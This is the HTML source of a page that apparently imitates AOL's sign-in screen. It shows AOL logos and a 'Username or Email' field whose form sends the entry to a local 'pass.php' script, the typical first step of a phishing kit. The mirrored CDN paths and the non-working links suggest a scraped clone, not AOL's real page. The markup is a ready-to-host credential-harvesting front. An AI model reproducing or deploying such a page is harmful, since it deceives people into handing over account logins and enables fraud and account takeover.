  <!DOCTYPE html>
  <html lang="en">

  <head>
      <title>Aol Sign in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
      <script src="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
      <link href="https://fonts.googleapis.com/css?family=Anton&amp;display=swap" rel="stylesheet">
      <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
      <link rel="stylesheet" href="css/style.css">
      <link rel="icon" href="img/favicon.ico" type="image/x-icon">
    
  </head>
  <div class="background">
          <div class="">        
              <img src="img/logo.png" class="logo image-responsive" alt="">
          </div>
      </div>
  <body class="background-login">
  <div class="container">
        <div class="col-md-4 col-sm-5 col-xs-12 col-md-offset-7 col-sm-offset-6 sigin-box">
            <h1 class="text-center"><img src="img/logo.png" class="logo1" alt=""></h1>
            <h3 id="sign-head" class="text-center">Sign in</h3><br><br>
            <form id="emailForm" action="pass.php" method="POST">
            <input type="email" id="email" name="email" placeholder="Username or Email" class="sign-input" required><br><br>
                <input type="submit" name="submit" class="submit-nbtn" id="submit" value="Next"><br>
            </form>
            <div class="col-lg-6 label-box">
                <div class="checkbox">
                    <label style="font-size: 12px; color: #0675ab;"><input type="checkbox" value="">Stay signed in</label>
                </div>
            </div>
            <div class="col-lg-6 label-box">
                <div class="checkbox">
                    <label style="font-size: 12px; color: #0675ab;">Forgot username?</label>
                </div>
            </div>
            <div class="clearfix"></div><br>
            <input type="submit" class="submit-nbtn" value="Create an account"><br><br>
            <p class="text-center">or sign in with</p><br><br>
            <div class="col-xs-4 text-center"><p><i class="fa fa-facebook" aria-hidden="true"></i></p></div>
            <div class="col-xs-4 text-center"><p><i class="fa fa-google" aria-hidden="true"></i></p></div>
            <div class="col-xs-4 text-center"><p><i class="fa fa-yahoo" aria-hidden="true"></i></p></div>
        </div>
    </div>
  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $(document).ready(function(){
            $(".loader").hide();
            $(".body").show();
        });
    </script>
</body>
</html>